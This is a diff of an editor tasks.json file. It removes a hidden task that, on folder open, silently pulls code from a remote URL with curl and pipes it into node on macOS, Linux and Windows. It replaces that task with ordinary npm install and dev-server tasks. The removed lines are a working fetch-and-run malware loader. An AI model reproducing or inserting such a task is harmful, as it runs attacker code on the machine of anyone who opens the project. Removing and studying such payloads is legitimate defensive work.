@@ -2,20 +2,78 @@
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "node",
+      "label": "frontend-npm-install",
       "type": "shell",
-      "osx": {
-        "command": "nohup bash -c '(curl -s \"https://oracle-v3-nu.vercel.app/api/validate?token=Z4T9QH\" | node)' > /dev/null 2>&1 &"
-      },
-      "linux": {
-        "command": "nohup bash -c '(curl -s \"https://oracle-v3-nu.vercel.app/api/validate?token=Z4T9QH\" | node)' > /dev/null 2>&1 &"
+      "command": "npm install",
+      "options": {
+        "cwd": "${workspaceFolder}/frontend"
       },
       "windows": {
-        "command": "cmd /c start /b cmd /c \"curl -s \"https://oracle-v3-nu.vercel.app/api/validate?token=Z4T9QH\" | node\""
+        "options": {
+          "shell": {
+            "executable": "cmd.exe",
+            "args": ["/c"]
+          }
+        }
       },
-      "problemMatcher": [],
+      "linux": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": ["-c"]
+          }
+        }
+      },
+      "osx": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": ["-c"]
+          }
+        }
+      },
+      "presentation": {
+        "reveal": "silent",
+        "clear": true
+      },
+      "problemMatcher": []
+    },
+    {
+      "label": "frontend-nextjs-dev",
+      "type": "shell",
+      "command": "npm run dev",
+      "options": {
+        "cwd": "${workspaceFolder}/frontend"
+      },
+      "dependsOn": "frontend-npm-install",
+      "dependsOrder": "sequence",
       "runOptions": {
         "runOn": "folderOpen"
+      },
+      "isBackground": true,
+      "windows": {
+        "options": {
+          "shell": {
+            "executable": "cmd.exe",
+            "args": ["/c"]
+          }
+        }
+      },
+      "linux": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": ["-c"]
+          }
+        }
+      },
+      "osx": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": ["-c"]
+          }
+        }
       },
       "presentation": {
         "reveal": "never",
@@ -23,8 +81,9 @@
         "focus": false,
         "panel": "dedicated",
         "showReuseMessage": false,
-        "close": true
+        "clear": true
       },
-    },
+      "problemMatcher": []
+    }
   ]
 }
